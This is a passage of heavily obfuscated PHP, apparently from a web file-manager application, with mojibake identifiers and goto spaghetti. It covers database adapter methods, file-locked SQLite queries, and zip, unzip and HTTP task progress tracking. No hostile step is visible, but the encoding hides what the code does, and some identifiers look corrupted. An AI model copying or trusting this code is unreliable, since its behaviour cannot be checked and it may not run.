142\154\x65\x5f\x6e\141\155\145\12\x9\x9\x57\x48\105\122\105\x20\40\40\x74\x2e\164\141\x62\154\x65\137\x6e\141\155\145\40\75\x20\47{$BäÚ„§É©}\47"; break; case $F¨ª³×Äò¾[838]: $ağ¯öêñÊ³ = $F¨ª³×Äò¾[839] . $BäÚ„§É© . $F¨ª³×Äò¾[840]; break; case $F¨ª³×Äò¾[820]: case $F¨ª³×Äò¾[822]: $ağ¯öêñÊ³ = $F¨ª³×Äò¾[841] . $F¨ª³×Äò¾[842] . $F¨ª³×Äò¾[843] . strtoupper($BäÚ„§É©) . $F¨ª³×Äò¾[844] . strtoupper($BäÚ„§É©) . $F¨ª³×Äò¾[845]; break; case $F¨ª³×Äò¾[846]: $ağ¯öêñÊ³ = $F¨ª³×Äò¾[847] . $BäÚ„§É© . $F¨ª³×Äò¾[848]; break; case $F¨ª³×Äò¾[821]: break; case $F¨ª³×Äò¾[849]: default: $ağ¯öêñÊ³ = $F¨ª³×Äò¾[850] . ($this->dbType == $F¨ª³×Äò¾[849] ? "\140{$BäÚ„§É©}\140" : $BäÚ„§É©); } } goto fÍ‚ˆšŒñ¡; dŸÃ´èì¼ã: } public function getTables($cÏÏ›×öàÉ = '') { $f¢…â„Ó¤— =& $_SERVER[¹÷ˆ§éÒ°ú]; if (think_config($f¢…â„Ó¤—[852])) { $eĞÅÙ×áä = str_replace($f¢…â„Ó¤—[853], $cÏÏ›×öàÉ, think_config($f¢…â„Ó¤—[852])); } else { switch ($this->dbType) { case $f¢…â„Ó¤—[820]: case $f¢…â„Ó¤—[822]: $eĞÅÙ×áä = $f¢…â„Ó¤—[854]; break; case $f¢…â„Ó¤—[819]: case $f¢…â„Ó¤—[837]: $eĞÅÙ×áä = $f¢…â„Ó¤—[855]; break; case $f¢…â„Ó¤—[846]: $eĞÅÙ×áä = $f¢…â„Ó¤—[856]; break; case $f¢…â„Ó¤—[821]: think_exception(think_lang($f¢…â„Ó¤—[857]) . $f¢…â„Ó¤—[858]); break; case $f¢…â„Ó¤—[838]: $eĞÅÙ×áä = $f¢…â„Ó¤—[52] . $f¢…â„Ó¤—[53] . $f¢…â„Ó¤—[54]; break; case $f¢…â„Ó¤—[849]: default: if (!empty($cÏÏ›×öàÉ)) { $eĞÅÙ×áä = $f¢…â„Ó¤—[802] . $cÏÏ›×öàÉ; } else { $eĞÅÙ×áä = $f¢…â„Ó¤—[803]; } } } $E¤Ã‹°§àÈ = $this->query($eĞÅÙ×áä); $eÂãƒ‰æ = array(); foreach ($E¤Ã‹°§àÈ as $Aê¿–¨ùŸ‰ => $cæèåĞÊ™) { $eÂãƒ‰æ[$Aê¿–¨ùŸ‰] = current($cæèåĞÊ™); } return $eÂãƒ‰æ; } protected function parseLimit($aÚô„Ä¯Ù) { $FÔ•µóõù¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d£ØãİÈ¬´ = $FÔ•µóõù¡[43]; if (!empty($aÚô„Ä¯Ù)) { switch ($this->dbType) { case $FÔ•µóõù¡[846]: case $FÔ•µóõù¡[838]: $aÚô„Ä¯Ù = explode($FÔ•µóõù¡[57], $aÚô„Ä¯Ù); if (count($aÚô„Ä¯Ù) > 1) { $d£ØãİÈ¬´ .= $FÔ•µóõù¡[58] . $aÚô„Ä¯Ù[1] . $FÔ•µóõù¡[59] . $aÚô„Ä¯Ù[0] . $FÔ•µóõù¡[60]; } else { $d£ØãİÈ¬´ .= $FÔ•µóõù¡[58] . $aÚô„Ä¯Ù[0] . $FÔ•µóõù¡[60]; } break; case $FÔ•µóõù¡[819]: case $FÔ•µóõù¡[837]: break; case $FÔ•µóõù¡[821]: break; case $FÔ•µóõù¡[820]: case $FÔ•µóõù¡[822]: break; case $FÔ•µóõù¡[849]: default: $d£ØãİÈ¬´ .= $FÔ•µóõù¡[58] . $aÚô„Ä¯Ù . $FÔ•µóõù¡[60]; } } return $d£ØãİÈ¬´; } public function parseKey(&$fÇË•ëŸñÁ, $eæôÍÉùÑÔ = true) { $D¼ƒ™¬ª•Â =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($eæôÍÉùÑÔ) { $fÇË•ëŸñÁ = $this->parseKeyCheck($fÇË•ëŸñÁ); } if ($this->dbType == $D¼ƒ™¬ª•Â[849]) { if ($fÇË•ëŸñÁ != $D¼ƒ™¬ª•Â[188] && !preg_match($D¼ƒ™¬ª•Â[813], $fÇË•ëŸñÁ)) { $fÇË•ëŸñÁ = $D¼ƒ™¬ª•Â[814] . trim($fÇË•ëŸñÁ, $D¼ƒ™¬ª•Â[814]) . $D¼ƒ™¬ª•Â[814]; } return $fÇË•ëŸñÁ; } else { return parent::parseKey($fÇË•ëŸñÁ); } } public function close() { $this->_linkID = null; } public function error() { $däì¤ä¸êÖ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->PDOStatement) { $aù¥Ó²éÍ‘ = $this->PDOStatement->errorInfo(); $this->error = $aù¥Ó²éÍ‘[1] . $däì¤ä¸êÖ[14] . $aù¥Ó²éÍ‘[2]; } else { $this->error = $däì¤ä¸êÖ[43]; } if ($däì¤ä¸êÖ[43] != $this->queryStr) { $this->error .= LNG($däì¤ä¸êÖ[55]) . $this->queryStr; } think_trace($this->error, $däì¤ä¸êÖ[43], $däì¤ä¸êÖ[56]); return $this->error; } public function escapeString($E‚…Àœ¼°) { $dé–İÄˆ«ì =& $_SERVER[¹÷ˆ§éÒ°ú]; switch ($this->dbType) { case $dé–İÄˆ«ì[846]: case $dé–İÄˆ«ì[819]: case $dé–İÄˆ«ì[837]: case $dé–İÄˆ«ì[849]: return addslashes($E‚…Àœ¼°); case $dé–İÄˆ«ì[821]: case $dé–İÄˆ«ì[838]: case $dé–İÄˆ«ì[820]: case $dé–İÄˆ«ì[822]: return str_ireplace($dé–İÄˆ«ì[67], $dé–İÄˆ«ì[68], $E‚…Àœ¼°); } } protected function parseValue($C…»šøò¡Ù) { $BßŞâÑ·Å™ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_string($C…»šøò¡Ù)) { $C…»šøò¡Ù = strpos($C…»šøò¡Ù, $BßŞâÑ·Å™[14]) === 0 ? $this->escapeString($C…»šøò¡Ù) : $BßŞâÑ·Å™[859] . $this->escapeString($C…»šøò¡Ù) . $BßŞâÑ·Å™[859]; } elseif (isset($C…»šøò¡Ù[0]) && is_string($C…»šøò¡Ù[0]) && strtolower($C…»šøò¡Ù[0]) == $BßŞâÑ·Å™[296]) { $C…»šøò¡Ù = $this->escapeString($C…»šøò¡Ù[1]); } elseif (is_array($C…»šøò¡Ù)) { $C…»šøò¡Ù = array_map(array($this, $BßŞâÑ·Å™[860]), $C…»šøò¡Ù); } elseif (is_bool($C…»šøò¡Ù)) { $C…»šøò¡Ù = $C…»šøò¡Ù ? $BßŞâÑ·Å™[95] : $BßŞâÑ·Å™[481]; } elseif (is_null($C…»šøò¡Ù)) { $C…»šøò¡Ù = $BßŞâÑ·Å™[111]; } return $C…»šøò¡Ù; } public function getLastInsertId() { $C¿½’ÖµÈ‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; switch ($this->dbType) { case $C¿½’ÖµÈ‰[846]: case $C¿½’ÖµÈ‰[838]: case $C¿½’ÖµÈ‰[819]: case $C¿½’ÖµÈ‰[837]: case $C¿½’ÖµÈ‰[821]: case $C¿½’ÖµÈ‰[849]: return $this->_linkID->lastInsertId(); case $C¿½’ÖµÈ‰[820]: case $C¿½’ÖµÈ‰[822]: $D‰Ò™œˆ†ù = $this->table; $F×İÉ¬§½Ù = $this->query("\123\105\x4c\x45\103\x54\40{$D‰Ò™œˆ†ù}\x2e\x63\165\162\x72\166\x61\x6c\40\143\165\x72\162\166\141\154\40\x46\x52\117\x4d\x20\144\x75\x61\x6c"); return $F×İÉ¬§½Ù ? $F×İÉ¬§½Ù[0][$C¿½’ÖµÈ‰[861]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($d¡šÛ…›Ù) { goto AÖÇÓ‘Ğ; AÖÇÓ‘Ğ: $FÁ‚‚øÜ±² =& $_SERVER[¹÷ˆ§éÒ°ú]; $cÊçØŸÊ¾¹ = DATA_PATH . $FÁ‚‚øÜ±²[862]; $aâìİÆ…çÀ = fopen($cÊçØŸÊ¾¹, $FÁ‚‚øÜ±²[863]); goto aµ¾ó®À“Ä; aµ¾ó®À“Ä: if (!$aâìİÆ…çÀ) { return !1; } if (flock($aâìİÆ…çÀ, LOCK_EX)) { $cğÕ§ÜÑ³‰ = parent::query($d¡šÛ…›Ù); flock($aâìİÆ…çÀ, LOCK_UN); fclose($aâìİÆ…çÀ); return $cğÕ§ÜÑ³‰; } flock($aâìİÆ…çÀ, LOCK_UN); goto CĞâÙĞ˜Í; CĞâÙĞ˜Í: fclose($aâìİÆ…çÀ); show_json($FÁ‚‚øÜ±²[864], !1); return !1; goto cÇ¶°¥£í”; cÇ¶°¥£í”: } public function execute($f‰Ö‹°âÓØ) { goto dã¥‡ÛÇ‰Ú; aœİóí…×Ÿ: fclose($e‡åÀ„—Âê); show_json($FáóÕòŒÊ×[864], !1); return !1; goto FÊÌÈ»£Û ; dã¥‡ÛÇ‰Ú: $FáóÕòŒÊ× =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÎ˜´ÔøÀ = DATA_PATH . $FáóÕòŒÊ×[862]; $e‡åÀ„—Âê = fopen($FÎ˜´ÔøÀ, $FáóÕòŒÊ×[863]); goto AØ±êèêƒ¯; AØ±êèêƒ¯: if (!$e‡åÀ„—Âê) { return !1; } if (flock($e‡åÀ„—Âê, LOCK_EX)) { $C‹Ó¢°Ğ×‰ = parent::execute($f‰Ö‹°âÓØ); flock($e‡åÀ„—Âê, LOCK_UN); fclose($e‡åÀ„—Âê); return $C‹Ó¢°Ğ×‰; } flock($e‡åÀ„—Âê, LOCK_UN); goto aœİóí…×Ÿ; FÊÌÈ»£Û : } } class DbSqlite3 extends DbSqlite3Base { public function query($Dßì×öİ‹„) { goto C¸ã‹ª«ñ¯; DäÆôÜ“œö: if (!$fš½¼†®Ù) { return !1; } if (flock($fš½¼†®Ù, LOCK_EX)) { $DöÅ½±å = parent::query($Dßì×öİ‹„); flock($fš½¼†®Ù, LOCK_UN); fclose($fš½¼†®Ù); return $DöÅ½±å; } flock($fš½¼†®Ù, LOCK_UN); goto e®¢·ÉßÕù; e®¢·ÉßÕù: fclose($fš½¼†®Ù); show_json($Aõó÷…İç¾[864], !1); return !1; goto FÄ¨ŞÙôçó; C¸ã‹ª«ñ¯: $Aõó÷…İç¾ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÉàæ“ â½ = DATA_PATH . $Aõó÷…İç¾[862]; $fš½¼†®Ù = fopen($AÉàæ“ â½, $Aõó÷…İç¾[863]); goto DäÆôÜ“œö; FÄ¨ŞÙôçó: } public function execute($eÕ®Ç´ïª³) { goto bğĞ¨ô®Æø; EãíŒ‡Ší: if (!$E¤…²²ö«) { return !1; } if (flock($E¤…²²ö«, LOCK_EX)) { $D´˜ô¯ÖæÒ = parent::execute($eÕ®Ç´ïª³); flock($E¤…²²ö«, LOCK_UN); fclose($E¤…²²ö«); return $D´˜ô¯ÖæÒ; } flock($E¤…²²ö«, LOCK_UN); goto Bª÷·˜…•; Bª÷·˜…•: fclose($E¤…²²ö«); show_json($bãô†¿÷ËÜ[864], !1); return !1; goto bœİ‹¹å«´; bğĞ¨ô®Æø: $bãô†¿÷ËÜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $døˆÚ³­Ê = DATA_PATH . $bãô†¿÷ËÜ[862]; $E¤…²²ö« = fopen($døˆÚ³­Ê, $bãô†¿÷ËÜ[863]); goto EãíŒ‡Ší; bœİ‹¹å«´: } } goto cÕ‰ì•æ•‘; eÛÍ¢³£: class TaskHttp extends Task { protected function startAfter() { $A™“±ï¤Ôª =& $_SERVER[¹÷ˆ§éÒ°ú]; $eŞ¯ƒÈßÄ =& $this->task; $eŞ¯ƒÈßÄ[$A™“±ï¤Ôª[1491]] = 1; Hook::bind($A™“±ï¤Ôª[1464], array($this, $A™“±ï¤Ôª[1492])); Hook::bind($A™“±ï¤Ôª[1466], array($this, $A™“±ï¤Ôª[1493])); Hook::bind($A™“±ï¤Ôª[1468], array($this, $A™“±ï¤Ôª[1494])); } protected function endAfter() { $A¸öª¹é =& $_SERVER[¹÷ˆ§éÒ°ú]; Hook::unbind($A¸öª¹é[1464], array($this, $A¸öª¹é[1492])); Hook::unbind($A¸öª¹é[1466], array($this, $A¸öª¹é[1493])); Hook::unbind($A¸öª¹é[1468], array($this, $A¸öª¹é[1494])); } public function progressStart($eÎÁ—œÛ§í) { $a¢æŠÇ¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cºğÅˆ×Å = curl_getinfo($eÎÁ—œÛ§í); self::log($a¢æŠÇ¶[1495] . $cºğÅˆ×Å[$a¢æŠÇ¶[306]]); self::valueSet($this->task[$a¢æŠÇ¶[378]], $this->task); } public function progressEnd($F«ã’®êÈ¾) { $fö°¼¸¤‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::log($fö°¼¸¤‘[1496] . $this->task[$fö°¼¸¤‘[378]]); $this->end(); } public function progress($D¾ÁçáŸÏƒ, $DŠ¤ÊİÛÔâ, $C‡±½„åá, $EÈÄÁÁ‡Ö, $e°æ¦…ë ¼) { $f‚ÜºÎ¡‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AŞ…äªÑ£‚ =& $this->task; if ($e°æ¦…ë ¼ > 0) { $AŞ…äªÑ£‚[$f‚ÜºÎ¡‹[967]] = $AŞ…äªÑ£‚[$f‚ÜºÎ¡‹[967]] == 0 ? $EÈÄÁÁ‡Ö : $AŞ…äªÑ£‚[$f‚ÜºÎ¡‹[967]]; $AŞ…äªÑ£‚[$f‚ÜºÎ¡‹[981]] = $e°æ¦…ë ¼; } else { if ($C‡±½„åá > 0) { $AŞ…äªÑ£‚[$f‚ÜºÎ¡‹[967]] = $AŞ…äªÑ£‚[$f‚ÜºÎ¡‹[967]] == 0 ? $DŠ¤ÊİÛÔâ : $AŞ…äªÑ£‚[$f‚ÜºÎ¡‹[967]]; $AŞ…äªÑ£‚[$f‚ÜºÎ¡‹[981]] = $C‡±½„åá; } } $this->update(); self::log("\160\x72\x6f\x67\162\145\163\x73\110\x74\x74\160\72\x64\x6f\x77\x6e\x3a{$C‡±½„åá}\x2f{$DŠ¤ÊİÛÔâ}\x3b\40\x75\160\x6c\x6f\x61\x64\72{$e°æ¦…ë ¼}\57{$EÈÄÁÁ‡Ö}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto bæ„‘Šƒºî; AØæĞØøøğ: if (!$a’Œçªğ¿ğ[$F™å††¯[1332]]) { $a’Œçªğ¿ğ[$F™å††¯[1332]] = LNG($F™å††¯[1501]); } goto fëÔÂ˜è±«; A‚Ğ©Äù©Ø: Hook::bind($F™å††¯[1026], array($this, $F™å††¯[1499])); $a’Œçªğ¿ğ =& $this->task; $a’Œçªğ¿ğ[$F™å††¯[1500]] = $F™å††¯[1031]; goto AØæĞØøøğ; bæ„‘Šƒºî: $F™å††¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; parent::startAfter(); Hook::bind($F™å††¯[1497], array($this, $F™å††¯[1498])); goto A‚Ğ©Äù©Ø; fëÔÂ˜è±«: } protected function endAfter() { $FÓ­å¦ÄâÄ =& $_SERVER[¹÷ˆ§éÒ°ú]; parent::endAfter(); Hook::unbind($FÓ­å¦ÄâÄ[1497], array($this, $FÓ­å¦ÄâÄ[1498])); Hook::unbind($FÓ­å¦ÄâÄ[1026], array($this, $FÓ­å¦ÄâÄ[1499])); } public function updateAfter() { $Fö‰¿ñêÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cš¯÷ß‡óË =& $this->task; if (!$Cš¯÷ß‡óË[$Fö‰¿ñêÊ[967]] || !$Cš¯÷ß‡óË[$Fö‰¿ñêÊ[693]]) { return; } if ($Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1500]] == $Fö‰¿ñêÊ[1031]) { $f‰‚Œ¦–ëÒ = 0; if ($Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1472]]) { $f‰‚Œ¦–ëÒ = $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1473]] / $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1472]]; } $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1428]] = $f‰‚Œ¦–ëÒ * 0.3; } else { if ($Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1500]] == $Fö‰¿ñêÊ[312]) { $f‰‚Œ¦–ëÒ = $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[981]] / $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[967]]; $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1428]] = 0.3 + $f‰‚Œ¦–ëÒ * 0.4; } else { if ($Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1500]] == $Fö‰¿ñêÊ[115]) { $Cï§¼‰Õ²§ = 0; if ($Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1474]] == $Fö‰¿ñêÊ[115]) { $Cï§¼‰Õ²§ = $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1473]]; } $f‰‚Œ¦–ëÒ = ($Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1477]] + $Cï§¼‰Õ²§) / $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[693]]; $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1428]] = 0.3 + 0.4 + $f‰‚Œ¦–ëÒ * 0.3; } } } if ($Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1428]] > 0) { $B¿ºÃ½¡Ìê = timeFloat() - $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1430]] - $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1433]]; $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1434]] = $B¿ºÃ½¡Ìê * (1 - $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1428]]) / $Cš¯÷ß‡óË[$Fö‰¿ñêÊ[1428]]; } } public function addFile($bù‚—Í‹ˆØ) { goto e†ÆÛÛ•¢¼; Bˆ‹å•Ô¼Ğ: $dŒâ»…¹î‚[$céŸÄ„ƒˆÁ[967]] = 1; $eôãÜöË«§ = 0; $dŒâ»…¹î‚[$céŸÄ„ƒˆÁ[1481]] = array($céŸÄ„ƒˆÁ[1482] => $eôãÜöË«§ + 1, $céŸÄ„ƒˆÁ[397] => $aÜ†›±Œ[$céŸÄ„ƒˆÁ[38]], $céŸÄ„ƒˆÁ[87] => $aÜ†›±Œ[$céŸÄ„ƒˆÁ[87]], $céŸÄ„ƒˆÁ[479] => $aÜ†›±Œ[$céŸÄ„ƒˆÁ[479]] ? $aÜ†›±Œ[$céŸÄ„ƒˆÁ[479]] : $aÜ†›±Œ[$céŸÄ„ƒˆÁ[87]]); goto FŠœ»Ûå; F‡¾—ë¤ š: $dŒâ»…¹î‚[$céŸÄ„ƒˆÁ[969]] = $céŸÄ„ƒˆÁ[1489]; $dŒâ»…¹î‚[$céŸÄ„ƒˆÁ[1474]] = $céŸÄ„ƒˆÁ[1031]; $dŒâ»…¹î‚[$céŸÄ„ƒˆÁ[693]] = $aÜ†›±Œ[$céŸÄ„ƒˆÁ[89]]; goto Bˆ‹å•Ô¼Ğ; FŠœ»Ûå: $this->update(); goto dİ¦¼³ïİ; cßçïÉ ƒŞ: $dŒâ»…¹î‚[$céŸÄ„ƒˆÁ[1470]] = $aÜ†›±Œ[$céŸÄ„ƒˆÁ[38]]; $dŒâ»…¹î‚[$céŸÄ„ƒˆÁ[1472]] = $aÜ†›±Œ[$céŸÄ„ƒˆÁ[89]]; $dŒâ»…¹î‚[$céŸÄ„ƒˆÁ[1473]] = 0; goto F‡¾—ë¤ š; e†ÆÛÛ•¢¼: $céŸÄ„ƒˆÁ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dŒâ»…¹î‚ =& $this->task; $aÜ†›±Œ = IO::info($bù‚—Í‹ˆØ); goto cßçïÉ ƒŞ; dİ¦¼³ïİ: } public function unzipAfter($Aƒ½Ù·î²®) { goto bÇƒºîˆ§; d®Š¸Š²: if ($FÀÖË§ÁïÔ[$f»¹˜‰Šè[39]] == $f»¹˜‰Šè[179]) { $E±ˆÍÃ˜£š[$f»¹˜‰Šè[967]] = 1; } else { $E±ˆÍÃ˜£š[$f»¹˜‰Šè[967]] = $FÀÖË§ÁïÔ[$f»¹˜‰Šè[92]][$f»¹˜‰Šè[90]]; } $E±ˆÍÃ˜£š[$f»¹˜‰Šè[969]] = $f»¹˜‰Šè[43]; $E±ˆÍÃ˜£š[$f»¹˜‰Šè[1474]] = 0; goto DÈ°ÂŸÓ‚£; C® ÷›äß: $E±ˆÍÃ˜£š[$f»¹˜‰Šè[1470]] = $f»¹˜‰Šè[43]; $E±ˆÍÃ˜£š[$f»¹˜‰Šè[1477]] = 0; $E±ˆÍÃ˜£š[$f»¹˜‰Šè[693]] = $FÀÖË§ÁïÔ[$f»¹˜‰Šè[89]]; goto f¯©‚ªàäÒ; f¯©‚ªàäÒ: $this->update(); self::log($f»¹˜‰Šè[1502] . json_encode(array($E±ˆÍÃ˜£š, $FÀÖË§ÁïÔ))); goto dµÙéÀÍâÑ; C¬ØõŠ˜: $FÀÖË§ÁïÔ = IO::infoWithChildren($Aƒ½Ù·î²®); $c‡à×ã†Ä… = 0; $E±ˆÍÃ˜£š[$f»¹˜‰Šè[1481]] = array($f»¹˜‰Šè[1482] => $c‡à×ã†Ä… + 1, $f»¹˜‰Šè[397] => $FÀÖË§ÁïÔ[$f»¹˜‰Šè[38]], $f»¹˜‰Šè[87] => $FÀÖË§ÁïÔ[$f»¹˜‰Šè[87]], $f»¹˜‰Šè[479] => $FÀÖË§ÁïÔ[$f»¹˜‰Šè[479]] ? $FÀÖË§ÁïÔ[$f»¹˜‰Šè[479]] : $FÀÖË§ÁïÔ[$f»¹˜‰Šè[87]]); goto d®Š¸Š²; DÈ°ÂŸÓ‚£: $E±ˆÍÃ˜£š[$f»¹˜‰Šè[981]] = 0; $E±ˆÍÃ˜£š[$f»¹˜‰Šè[1472]] = 0; $E±ˆÍÃ˜£š[$f»¹˜‰Šè[1473]] = 0; goto C® ÷›äß; bÇƒºîˆ§: $f»¹˜‰Šè =& $_SERVER[¹÷ˆ§éÒ°ú]; $E±ˆÍÃ˜£š =& $this->task; $E±ˆÍÃ˜£š[$f»¹˜‰Šè[1500]] = $f»¹˜‰Šè[115]; goto C¬ØõŠ˜; dµÙéÀÍâÑ: } public function nameParse($bãœ„æ†äÎ) { goto aÌ’ïÀŠò; Ağµ³£Ô§©: $A „•ÉÓØÛ = get_path_this($bãœ„æ†äÎ); if (strstr($A „•ÉÓØÛ, $aÆˆ“Õâò‡[103])) { $b¼Ê•ØÁæŒ[$aÆˆ“Õâò‡[981]] += 1; $b¼Ê•ØÁæŒ[$aÆˆ“Õâò‡[967]] += 1; } $b¼Ê•ØÁæŒ[$aÆˆ“Õâò‡[1470]] = $bãœ„æ†äÎ; goto D¤âõì…§›; aÌ’ïÀŠò: $aÆˆ“Õâò‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b¼Ê•ØÁæŒ =& $this->task; if ($b¼Ê•ØÁæŒ[$aÆˆ“Õâò‡[1500]] == $aÆˆ“Õâò‡[1031]) { $b¼Ê•ØÁæŒ[$aÆˆ“Õâò‡[1500]] = $aÆˆ“Õâò‡[312]; $b¼Ê•ØÁæŒ[$aÆˆ“Õâò‡[1477]] = 0; $b¼Ê•ØÁæŒ[$aÆˆ“Õâò‡[693]] = 0; } goto Ağµ³£Ô§©; D¤âõì…§›: $this->update(); goto Bİ˜ãŒ‚¬Á; Bİ˜ãŒ‚¬Á: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $F±Ó©†Öğæ =& $_SERVER[¹÷ˆ§éÒ°ú]; parent::startAfter(); Hook::bind($F±Ó©†Öğæ[1503], array($this, $F±Ó©†Öğæ[1498])); $böƒœ‡ê· =& $this->task; $böƒœ‡ê·[$F±Ó©†Öğæ[1500]] = $F±Ó©†Öğæ[1031]; if (!$böƒœ‡ê·[$F±Ó©†Öğæ[1332]]) { $böƒœ‡ê·[$F±Ó©†Öğæ[1332]] = LNG($F±Ó©†Öğæ[1504]); } } protected function endAfter() { $aÌøé‰ÔØŞ =& $_SERVER[¹÷ˆ§éÒ°ú]; parent::endAfter(); Hook::unbind($aÌøé‰ÔØŞ[1503], array($this, $aÌøé‰ÔØŞ[1498])); } public function updateAfter() { $f±å³‘èÉ“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÒ«Ó¶Å© =& $this->task; if (!$eÒ«Ó¶Å©[$f±å³‘èÉ“[967]] || !$eÒ«Ó¶Å©[$f±å³‘èÉ“[693]]) { return; } if ($eÒ«Ó¶Å©[$f±å³‘èÉ“[1500]] == $f±å³‘èÉ“[1031]) { $aªÔˆî·ãè = $eÒ«Ó¶Å©[$f±å³‘èÉ“[1473]]; if ($eÒ«Ó¶Å©[$f±å³‘èÉ“[1474]] != $f±å³‘èÉ“[1031]) { $aªÔˆî·ãè = 0; } $Bçµ‰ÂëëÃ = ($eÒ«Ó¶Å©[$f±å³‘èÉ“[1477]] + $aªÔˆî·ãè) / $eÒ«Ó¶Å©[$f±å³‘èÉ“[693]]; $eÒ«Ó¶Å©[$f±å³‘èÉ“[1428]] = $Bçµ‰ÂëëÃ * 0.3; } else { if ($eÒ«Ó¶Å©[$f±å³‘èÉ“[1500]] == $f±å³‘èÉ“[312]) { $Bçµ‰ÂëëÃ = $eÒ«Ó¶Å©[$f±å³‘èÉ“[981]] / $eÒ«Ó¶Å©[$f±å³‘èÉ“[967]]; $eÒ«Ó¶Å©[$f±å³‘èÉ“[1428]] = 0.3 + $Bçµ‰ÂëëÃ * 0.5; } else { if ($eÒ«Ó¶Å©[$f±å³‘èÉ“[1500]] == $f±å³‘èÉ“[115]) { $Bçµ‰ÂëëÃ = 0; if ($eÒ«Ó¶Å©[$f±å³‘èÉ“[1472]]) { $Bçµ‰ÂëëÃ = $eÒ«Ó¶Å©[$f±å³‘èÉ“[1473]] / $eÒ«Ó¶Å©[$f±å³‘èÉ“[1472]]; } $eÒ«Ó¶Å©[$f±å³‘èÉ“[1428]] = 0.3 + 0.5 + $Bçµ‰ÂëëÃ * 0.2; } } } if ($eÒ«Ó¶Å©[$f±å³‘èÉ“[1428]] > 0) { $Bå…Ğèôİ = timeFloat() - $eÒ«Ó¶Å©[$f±å³‘èÉ“[1430]] - $eÒ«Ó¶Å©[$f±å³‘èÉ“[1433]]; $eÒ«Ó¶Å©[$f±å³‘èÉ“[1434]] = $Bå…Ğèôİ * (1 - $eÒ«Ó¶Å©[$f±å³‘èÉ“[1428]]) / $eÒ«Ó¶Å©[$f±å³‘èÉ“[1428]]; } } public function copyFileStart($DÂÇ”áğ”•, $Dƒ°ŒÕ…¨, $Eí¯ªµÍÕÂ, $d›ùßñäö¼, $b“ßŞ±Õ®ª, $C¤ôöŒ”è©) { $B†ã±éËµÎ =& $_SERVER[¹÷ˆ§éÒ°ú]; parent::copyFileStart($DÂÇ”áğ”•, $Dƒ°ŒÕ…¨, $Eí¯ªµÍÕÂ, $d›ùßñäö¼, $b“ßŞ±Õ®ª, $C¤ôöŒ”è©); $b¿ÍÑò×Ñ =& $this->task; if ($b¿ÍÑò×Ñ[$B†ã±éËµÎ[1500]] == $B†ã±éËµÎ[312]) { $b¿ÍÑò×Ñ[$B†ã±éËµÎ[1500]] = $B†ã±éËµÎ[115]; } $this->update(); } public function copyFileEnd($c„ßè¿å•, $CÜ“©äĞÁ, $BÉôóØºâ§, $eª›ˆÕØ¼ò, $CÖÎ†·»›©, $DÓ‚‰¾ğœ) { $dçò©ğÖ˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b„›İæî¾ =& $this->task; $b„›İæî¾[$dçò©ğÖ˜[1473]] = $b„›İæî¾[$dçò©ğÖ˜[1472]]; $b„›İæî¾[$dçò©ğÖ˜[1477]] += $b„›İæî¾[$dçò©ğÖ˜[1472]]; $b„›İæî¾[$dçò©ğÖ˜[1474]] = $dçò©ğÖ˜[43]; $this->update(); } public function nameParse($cŸóÌƒ•Œó) { $C¨¶õ‡Üâ† =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cµ‡¬éâÁ =& $this->task; if ($Cµ‡¬éâÁ[$C¨¶õ‡Üâ†[981]] < $Cµ‡¬éâÁ[$C¨¶õ‡Üâ†[967]]) { $E¸äã©Ô—á = get_path_this($cŸóÌƒ•Œó); if (strstr($E¸äã©Ô—á, $C¨¶õ‡Üâ†[103])) { $Cµ‡¬éâÁ[$C¨¶õ‡Üâ†[981]] += 1; } } if ($Cµ‡¬éâÁ[$C¨¶õ‡Üâ†[1500]] == $C¨¶õ‡Üâ†[1031]) { $Cµ‡¬éâÁ[$C¨¶õ‡Üâ†[1500]] = $C¨¶õ‡Üâ†[312]; } $Cµ‡¬éâÁ[$C¨¶õ‡Üâ†[1470]] = $cŸóÌƒ•Œó; $this->update(); } } goto f×¢öÑÅÌË; e¬ÖåÌÕâ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto A‡ŠóÒÓÃÚ; F„«å‹±ì: $this->tpl = TEMPLATE . MOD . $bÙ‹ÁÌ¶[18]; $this->_classObjectID = mt_rand(0, 10000); goto b…“½ƒ¡Ş; A‡ŠóÒÓÃÚ: $bÙ‹ÁÌ¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; global $in, $config; $this->config =& $config; goto F´³óçöÔô; F´³óçöÔô: $this->in =& $in; $this->values[$bÙ‹ÁÌ¶[16]] =& 